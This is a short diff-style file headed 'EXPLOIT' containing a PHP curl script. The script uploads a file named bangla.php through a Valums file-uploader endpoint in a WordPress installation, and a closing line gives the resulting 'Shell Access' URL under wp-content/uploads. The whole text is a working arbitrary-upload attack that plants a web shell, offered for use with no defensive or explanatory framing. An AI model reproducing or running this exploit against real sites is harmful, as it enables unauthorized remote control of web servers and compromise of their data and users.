@@ -1,0 +1,17 @@
+=================== EXPLOIT====================
+<?php
+
+$uploadfile="bangla.php"; 
+$ch =
+curl_init("http://www.example.com/wordpress/VALUMS_UPLOADER_PATH/php.php");
+curl_setopt($ch, CURLOPT_POST, true); 
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+array('qqfile'=>"@$uploadfile"));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$postResult = curl_exec($ch);
+curl_close($ch);
+print "$postResult";
+
+?>
+
+Shell Access: http://www.example.com/wp-content/uploads/2013/01/bangla.php
